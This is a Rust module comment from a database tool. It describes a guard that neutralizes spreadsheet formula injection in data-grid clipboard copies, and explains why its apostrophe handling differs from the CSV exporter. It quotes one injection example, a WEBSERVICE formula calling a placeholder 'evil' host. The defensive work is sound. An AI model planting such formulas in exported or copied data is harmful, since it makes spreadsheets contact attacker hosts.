//! Spreadsheet-formula neutralization for the data grid clipboard writers.
//!
//! #10542 neutralized formula injection in the CSV/TSV **file** exporters. The grid's
//! clipboard writers are a separate code path (`dbx_sql::data_grid_extractors`), so a
//! cell copied out of the grid and pasted into Excel was still emitted verbatim:
//! `=WEBSERVICE("https://evil")` executed on paste. This module closes that gap.
//!
//! The guard is applied to the **cell values before extraction** rather than to the
//! rendered output, so no delimited text has to be re-parsed. That keeps this module
//! free of any knowledge of separators, quote policies, the NULL sentinel, or
//! per-extractor escaping rules: the extractors keep owning all of that, and only the
//! text they are about to treat as a spreadsheet cell is prefixed.
//!
//! `dbx_sql_data` cannot depend on `dbx_formats` (the workspace enforces a one-way
//! boundary between those two leaf crates), so this shim lives one level up in
//! `dbx-core`, which already depends on `dbx-formats` and re-exports
//! `data_grid_extractors`. It shares the [`needs_formula_guard`] predicate with the
//! file exporters, so "does this text need a guard" is answered in exactly one place.
//!
//! It deliberately does **not** reuse [`dbx_formats::csv_export::push_formula_guard`],
//! whose extra branch doubles a literal leading apostrophe (`'+8613…` → `''+8613…`).
//! That doubling exists so DBX's own CSV importer, which strips one apostrophe, can
//! read the value back. The clipboard has no such reader: the spreadsheet is the
//! consumer, and Excel keeps a leading apostrophe as literal data on both paste and
//! CSV open (measured on Excel 16.0 — pasting `''+8613800000000` stores both
//! apostrophes, pasting `'+8613800000000` stores one). Doubling here would therefore
//! add a visible apostrophe rather than preserve the value. The two paths legitimately
//! differ because only one of them has a matching un-guard step.
//!
//! Only the extractors whose output lands in a spreadsheet are guarded. SQL, JSON,
//! XML, HTML, Markdown and the raw extractor must stay byte-exact: prefixing a SQL
//! statement or a JSON document would corrupt it.
